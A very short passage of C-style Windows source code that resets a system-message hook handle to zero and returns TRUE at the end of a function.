		hhookSysMsg = 0;
	}

	return TRUE;
}
